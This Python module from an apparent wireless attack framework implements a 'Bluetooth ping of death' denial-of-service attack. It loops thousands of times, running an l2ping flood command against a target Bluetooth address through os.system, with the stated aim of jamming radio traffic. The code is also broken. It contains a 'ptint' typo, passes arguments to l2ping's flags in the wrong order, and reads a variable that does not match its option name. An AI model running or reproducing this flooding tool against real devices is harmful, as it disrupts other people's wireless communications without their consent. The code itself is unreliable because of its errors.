import time,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "bluetooth_pod",
        "title"       : "Bluetooth ping of death attack",
        "module"      : "wireless/bluetoth/attack  bluetooth pod network  network_manager",
        "description" : "create traffic jams for the radio transmitter so that real traffic cannot get through"
}

options ={
  "INTERFACE" : [str(var.all_var['interface']),'enter the bluetoth interface'],
  "BHADDR"    : [str(var.all_var['bssid']),'enter the target bluetooth address'],
  "SIZE"      : [str(var.all_var['size']),'enter the size of packets (Default 600)']
}

def running():
        try:
                print ("")
                print (blue+"[*]"+default+ "Bluetooth Ping Of Death Attack Started ...")
                time.sleep(2)
                print ("")
                time.sleep(2)
                print ("") 
                for i in range(1, 10000):
                    order = ("l2ping -i {} -s {} -f {} ".format(var.all_var['interface'],var.all_var['bhaddr'],var.all_var['size']))
                    os.system(order)
                    ptint (blue+"[*]"+default+ "Sent")
                    time.sleep(3)
                time.sleep(5)
                print("\n")
                print (green_underline+"[+] Done"+default)
                time.sleep(2)
                print ("")
        except Exception as e:
                print(red+"\n[-]"+default+"Error : "+str(e))